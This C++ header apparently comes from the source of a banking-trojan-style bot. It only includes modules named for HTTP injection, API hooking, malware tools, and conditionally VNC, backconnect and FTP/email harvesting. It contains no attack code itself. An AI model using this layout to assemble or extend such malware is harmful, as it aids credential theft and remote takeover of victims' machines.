#pragma once 

#include "defines.h"

#include "..\common\mem.cpp"
#include "..\common\time.cpp"
#include "..\common\str.cpp"
#include "..\common\crypt.cpp"
#include "..\common\process.cpp"
#include "..\common\debug.cpp"
#include "..\common\wininet.cpp"
#include "..\common\ucl.cpp"
#include "..\common\wsocket.cpp"
#include "..\common\winsecurity.cpp"
#include "..\common\sync.cpp"
#include "..\common\math.cpp"
#include "..\common\mscab.cpp"
#include "..\common\threadsgroup.cpp"
#include "..\common\registry.cpp"
#include "..\common\malwaretools.cpp"
#include "..\common\gui.cpp"
#include "..\common\disasm.cpp"
#include "..\common\wahook.cpp"
#include "..\common\peimage.cpp"
#include "..\common\httptools.cpp"
#include "..\common\fs.cpp"
#include "..\common\binstorage.cpp"
#include "..\common\httpinject.cpp"
#include "..\common\baseoverlay.cpp"

#if(BO_SOFTWARE_FTP > 0 || BO_SOFTWARE_EMAIL > 0)
#  include "..\common\comlibrary.cpp"
#  include "..\common\xmlparser.cpp"
#endif

#if(BO_VNC > 0)
#  include "..\common\gdi.cpp"
#endif

#if(BO_BCSERVER_PLATFORMS > 0)
#  include "..\common\backconnect.cpp"
#endif
